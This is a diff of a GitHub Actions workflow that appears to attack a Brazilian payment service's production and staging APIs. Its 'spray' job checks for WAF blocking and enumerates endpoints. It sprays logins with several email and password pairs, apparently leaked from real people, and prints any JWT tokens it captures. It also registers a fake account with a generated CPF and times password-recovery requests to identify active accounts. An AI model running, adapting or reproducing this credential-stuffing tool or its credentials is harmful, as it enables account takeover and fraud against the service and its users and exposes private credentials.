@@ -1,5 +1,7 @@
 name: waf-v17-wwservices-hml
 on:
+  push:
+    branches: [main]
   workflow_dispatch:
 jobs:
   spray:
@@ -17,8 +19,6 @@ jobs:
         BASE="https://wpdataservice.wisepay.com.br"
         WWSVC="https://wwservices.wisepay.com.br"
         HML="https://wpdataservice-hml.wisepay.com.br"
-        WALLET_DEV="https://walletservices-dev.wisepay.com.br"
-
         MY_IP=$(curl -s -m 5 https://api.ipify.org 2>/dev/null || echo "unknown")
 
         # WAF check produção (us-east-1)
@@ -35,24 +35,9 @@ jobs:
           echo "[${{ matrix.attempt }}] PROD WAF blocking (IP: $MY_IP). Testing HML..."
         fi
 
-        echo ""
-        echo "=== P0: wwservices.wisepay.com.br (mesmo ALB us-east-1) ==="
-        # Mesmo ALB que wpdataservice - pode ser outro microserviço
-        for EP in \
-          "/login" \
-          "/health" \
-          "/users" \
-          "/users/me" \
-          "/companies" \
-          "/empresas" \
-          "/webhook" \
-          "/whitelabel" \
-          "/api" \
-          "/v1/login" \
-          "/v1/users"; do
-          RR=$(curl -A "$UA" -s -m 8 --connect-timeout 5 \
-            -H "type-application: web" \
-            "$WWSVC$EP" 2>/dev/null) || RR=""
+        echo "=== P0: wwservices.wisepay.com.br endpoint discovery ==="
+        for EP in "/login" "/health" "/users" "/empresas" "/webhook" "/whitelabel" "/api/v1/login"; do
+          RR=$(curl -A "$UA" -s -m 8 --connect-timeout 5 -H "type-application: web" "$WWSVC$EP" 2>/dev/null) || RR=""
           CODE=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
           MSG=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d)[:100])" 2>/dev/null || echo "${RR:0:60}")
           echo "WWSVC $CODE | $EP | $MSG"
@@ -60,59 +45,48 @@ jobs:
         done
 
         echo ""
-        echo "=== P1: wwservices login (mesmas creds) ==="
-        if $PROD_OK; then
-          for CRED in \
-            "icelaserbelem@gmail.com|ICELASER2021" \
-            "fabiane@petcenterbrasil.com.br|67896789" \
-            "nancyfigueredo@hotmail.com|12341234" \
-            "andersonmachado52@hotmail.com|sinho1777"; do
-            EMAIL="${CRED%%|*}"
-            PASS="${CRED##*|}"
-            RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
-              -H "Content-Type: application/json" -H "type-application: web" \
-              -X POST "$WWSVC/login" \
-              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RS=""
-            CODE=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
-            MSG=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:80])" 2>/dev/null || echo "${RS:0:80}")
-            if [ "$CODE" = "200" ]; then
-              TOKEN=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null)
-              echo "*** JWT WWSVC *** $EMAIL token=${TOKEN:0:60}"
-            else
-              echo "WWSVC_LOGIN $CODE | $EMAIL | $MSG"
-            fi
-            sleep 0.1
-          done
-        fi
+        echo "=== P1: wwservices login spray ==="
+        for CRED in \
+          "icelaserbelem@gmail.com|ICELASER2021" \
+          "fabiane@petcenterbrasil.com.br|67896789" \
+          "nancyfigueredo@hotmail.com|12341234" \
+          "andersonmachado52@hotmail.com|sinho1777"; do
+          EMAIL="${CRED%%|*}"
+          PASS="${CRED##*|}"
+          RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
+            -H "Content-Type: application/json" -H "type-application: web" \
+            -X POST "$WWSVC/login" \
+            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RS=""
+          CODE=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
+          MSG=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:80])" 2>/dev/null || echo "${RS:0:80}")
+          if [ "$CODE" = "200" ]; then
+            TOKEN=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null)
+            echo "*** JWT WWSVC *** $EMAIL token=${TOKEN:0:60}"
+          else
+            echo "WWSVC_LOGIN $CODE | $EMAIL | $MSG"
+          fi
+          sleep 0.1
+        done
 
         echo ""
-        echo "=== P2: HML (us-east-2) - check WAF ==="
+        echo "=== P2: HML WAF check ==="
         HML_CHECK=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
           -H "Content-Type: application/json" \
           -X POST "$HML/login" \
           -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' 2>/dev/null) || HML_CHECK=""
-        echo "HML_WAF: $(echo $HML_CHECK | head -c 200)"
+        HML_READABLE=$(echo "$HML_CHECK" | python3 -c "import sys,json; json.load(sys.stdin); print('OK')" 2>/dev/null || echo "BLOCKED")
+        echo "HML_WAF: $HML_READABLE | $(echo $HML_CHECK | head -c 150)"
 
-        HML_OK=false
-        if echo "$HML_CHECK" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
+        if [ "$HML_READABLE" = "OK" ]; then
           echo "*** HML WAF BYPASSED ***"
-          HML_OK=true
-
-          echo ""
-          echo "=== P3: HML login spray ==="
           for CRED in \
             "icelaserbelem@gmail.com|ICELASER2021" \
             "fabiane@petcenterbrasil.com.br|67896789" \
-            "nancyfigueredo@hotmail.com|12341234" \
-            "andersonmachado52@hotmail.com|sinho1777" \
-            "andrejunior1223@gmail.com|12341234" \
-            "marco@vanityestetica.com.br|12341234"; do
+            "nancyfigueredo@hotmail.com|12341234"; do
             EMAIL="${CRED%%|*}"
             PASS="${CRED##*|}"
-            RH=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
-              -H "Content-Type: application/json" \
-              -X POST "$HML/login" \
-              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RH=""
+            RH=$(curl -s -m 7 -A "$UA" -H "Content-Type: application/json" \
+              -X POST "$HML/login" -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RH=""
             CODE=$(echo "$RH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
             MSG=$(echo "$RH" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:80])" 2>/dev/null || echo "${RH:0:80}")
             if [ "$CODE" = "200" ]; then
@@ -124,22 +98,8 @@ jobs:
             sleep 0.1
           done
 
-          echo ""
-          echo "=== P4: HML - POST /users (criar conta sem JWT) ==="
-          DOMAIN=$(curl -s -m 10 "https://api.mail.tm/domains" | python3 -c "import sys,json; print(json.load(sys.stdin)['hydra:member'][0]['domain'])" 2>/dev/null || echo "")
-          if [ -n "$DOMAIN" ]; then
-            TM_EMAIL="ana.ferreira$(( RANDOM % 999 ))@${DOMAIN}"
-            TM_PASS="Temp$(date +%s | tail -c 7)!"
-            curl -s -m 10 -X POST "https://api.mail.tm/accounts" \
-              -H "Content-Type: application/json" \
-              -d "{\"address\":\"$TM_EMAIL\",\"password\":\"$TM_PASS\"}" > /dev/null 2>&1
-            TM_TOKEN=$(curl -s -m 10 -X POST "https://api.mail.tm/token" \
-              -H "Content-Type: application/json" \
-              -d "{\"address\":\"$TM_EMAIL\",\"password\":\"$TM_PASS\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || echo "")
-            echo "MAILTM: $TM_EMAIL token=${TM_TOKEN:0:30}"
-
-            # Tentar registrar no HML
-            CPF=$(python3 -I -c "
+          # HML - criar conta
+          CPF=$(python3 -I -c "
 import random
 d = [random.randint(0,9) for _ in range(9)]
 for w in ([10,9,8,7,6,5,4,3,2], [11,10,9,8,7,6,5,4,3,2]):
@@ -147,34 +107,15 @@ for w in ([10,9,8,7,6,5,4,3,2], [11,10,9,8,7,6,5,4,3,2]):
     d.append(0 if s < 2 else 11 - s)
 print(''.join(map(str,d)))
 ")
-            RUSER=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
-              -H "Content-Type: application/json" \
-              -X POST "$HML/users" \
-              -d "{\"name\":\"Ana Ferreira\",\"email\":\"$TM_EMAIL\",\"password\":\"Ana@2024!\",\"cpf\":\"$CPF\",\"phone\":\"11981234567\"}" \
-              2>/dev/null) || RUSER=""
-            echo "HML_REGISTER: $(echo $RUSER | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:300])' 2>/dev/null || echo "${RUSER:0:200}")"
-
-            # Aguardar email de verificação
-            if [ -n "$TM_TOKEN" ]; then
-              sleep 10
-              MSGS=$(curl -s -m 10 "https://api.mail.tm/messages" \
-                -H "Authorization: Bearer $TM_TOKEN") || MSGS=""
-              MSG_COUNT=$(echo "$MSGS" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('hydra:member',[])))" 2>/dev/null || echo "0")
-              echo "MAILTM_MSGS: $MSG_COUNT mensagens"
-              if [ "$MSG_COUNT" -gt "0" ]; then
-                MSG_ID=$(echo "$MSGS" | python3 -c "import sys,json; print(json.load(sys.stdin)['hydra:member'][0]['id'])" 2>/dev/null || echo "")
-                if [ -n "$MSG_ID" ]; then
-                  BODY=$(curl -s -m 10 "https://api.mail.tm/messages/$MSG_ID" \
-                    -H "Authorization: Bearer $TM_TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('text',d.get('html',''))[:500])" 2>/dev/null || echo "")
-                  echo "EMAIL_BODY: $BODY"
-                fi
-              fi
-            fi
-          fi
+          RUSER=$(curl -s -m 10 -A "$UA" -H "Content-Type: application/json" \
+            -X POST "$HML/users" \
+            -d "{\"name\":\"Ana Ferreira\",\"email\":\"ana.ferreira$(( RANDOM % 999 ))@gmail.com\",\"password\":\"Ana@2024!\",\"cpf\":\"$CPF\",\"phone\":\"11981234567\"}" \
+            2>/dev/null) || RUSER=""
+          echo "HML_REGISTER: $(echo $RUSER | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:300])' 2>/dev/null || echo "${RUSER:0:200}")"
         fi
 
         echo ""
-        echo "=== P5: Password recover timing (identificar empresas ativas) ==="
+        echo "=== P3: Password recover timing (empresa ativa?) ==="
         if $PROD_OK; then
           for EMAIL in \
             "icelaserbelem@gmail.com" \
